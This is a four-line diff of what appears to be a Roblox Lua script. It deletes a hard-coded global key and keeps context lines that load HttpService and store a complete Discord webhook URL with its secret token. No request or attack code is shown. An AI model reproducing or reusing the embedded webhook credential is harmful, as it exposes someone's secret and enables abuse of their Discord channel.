@@ -1,4 +1,4 @@
-_G.Key = "wuighuiwehuih2uihui2htgui2huighu2ihgui2h2iuhgui2huyi2hh2gui2hg2"
+
 HttpService = game:GetService("HttpService")
 Webhook_URL = "https://discord.com/api/webhooks/1097670054277021807/-m5vk7dNLPyvhTxrAsK7vGwftzODe81uUaq3tb9hDWGnLEJ__RbLbS4U2QM9iOKIZHjR"
 local Valid = false
